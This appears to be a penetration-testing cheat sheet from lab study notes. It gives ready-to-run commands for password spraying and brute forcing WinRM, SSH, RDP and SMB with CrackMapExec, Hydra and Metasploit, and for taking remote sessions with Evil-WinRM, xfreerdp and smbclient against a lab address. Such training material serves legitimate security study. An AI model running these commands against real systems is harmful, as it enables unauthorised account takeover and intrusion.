# Attacking Network Services
**Concept:** Exploiting valid credentials to gain remote access. 
**Key Insight:** Administrative services are rarely "vulnerable" to exploits in the traditional sense (buffer overflows). They are usually attacked via **Credential Spraying** (trying one password against many users) or **Brute Forcing** (trying many passwords against one user).
## 1. Common Service Ports
**Recon:** Always check these ports during enumeration (Phase 02) to identify potential entry points.

| **Service** | **Port(s)**                                | **Transport** | **Description**                              |
| ----------- | ------------------------------------------ | ------------- | -------------------------------------------- |
| *FTP*     | 21                                         | TCP           | File Transfer. Often allows anonymous login. |
| *SSH*     | 22                                         | TCP           | Linux Remote Access.                         |
| *Telnet*  | 23                                         | TCP           | Unencrypted Remote Access (Legacy).          |
| *SMTP*    | 25                                         | TCP           | Email Transfer.                              |
| *SMB*     | 139, 445                                   | TCP           | Windows File Sharing & IPC.                  |
| *SQL*     | 1433 (MSSQL)<br><br>  <br><br>3306 (MySQL) | TCP           | Database Services.                           |
| *RDP*     | 3389                                       | TCP/UDP       | Windows Remote Desktop.                      |
| *WinRM*   | 5985 (HTTP)<br><br>  <br><br>5986 (HTTPS)  | TCP           | PowerShell Remoting (Management).            |
## 2. WinRM (Windows Remote Management)
**Target:** Windows Servers (usually Port 5985). **Tooling:** `CrackMapExec` (or `NetExec`) for spraying, `Evil-WinRM` for access.
### Enumeration & Spraying (CrackMapExec)
**Goal:** Validate credentials across the network.
```shell
# General Syntax
crackmapexec winrm <TARGET_IP> -u <USER> -p <PASSWORD>

# Password Spraying (One password, list of users)
# Look for "Pwn3d!" in the output - this indicates Admin access.
crackmapexec winrm 10.129.42.197 -u users.txt -p 'Welcome1!'
```
### Access & Execution (Evil-WinRM)
**Goal:** Get a stable PowerShell session.
```shell
# Install
sudo gem install evil-winrm

# Connect
evil-winrm -i 10.129.42.197 -u administrator -p 'password123'
```
## 3. SSH (Secure Shell)
**Target:** Linux Servers (Port 22). 
**Tooling:** `Hydra` for brute-forcing, standard `ssh` client for access.
### Brute Forcing (Hydra)
**Warning:** SSH is slow to brute force. Limit threads (`-t`) to 4 to avoid bans.
```shell
# -L: User List | -P: Password List | -t: Threads
hydra -L users.txt -P passwords.txt -t 4 ssh://10.129.42.197
```
### Accessing
```shell
# Standard Connection
ssh user@10.129.42.197

# Bypass "Host Key Verification Failed" (Common in labs where IPs are reused)
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" user@10.129.42.197
```
## 4. RDP (Remote Desktop Protocol)
**Target:** Windows Workstations/Servers (Port 3389). 
**Tooling:** `Hydra` for brute-forcing, `xFreeRDP` for access.
### Brute Forcing (Hydra)
```shell
hydra -L users.txt -P passwords.txt rdp://10.129.42.197
```
### Accessing (xFreeRDP)
**Feature:** Drive Redirection allows you to mount a local folder to the remote victim, making file transfer (uploading exploits) easy.
```shell
# Connect and ignore certificate warnings
xfreerdp /v:10.129.42.197 /u:user /p:password /cert:ignore

# Connect + Mount local folder '/home/kali/tools' as 'Z:' on victim
xfreerdp /v:10.129.42.197 /u:user /p:pass /drive:tools,/home/kali/tools
```
## 5. SMB (Server Message Block)
**Target:** Windows File Shares (Port 445). 
**Tooling:** `Metasploit` or `CrackMapExec` for spraying, `smbclient` or `smbmap` for access.
### Brute Forcing / Spraying
**CrackMapExec (Fastest):**
```shell
# Spray creds and list available shares
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```

**Metasploit (Module):**
```shell
msfconsole -q
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.129.42.197
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```
### Enumerating & Accessing Shares
**Smbmap (Overview):**
```shell
# List permissions (Read/Write)
smbmap -H 10.129.42.197 -u john -p 'november'
```

**Smbclient (Interaction):**
```shell
# Connect to a share
smbclient -U user //10.129.42.197/ShareName

# Commands:
# > ls      (List files)
# > get     (Download file)
# > put     (Upload file)
```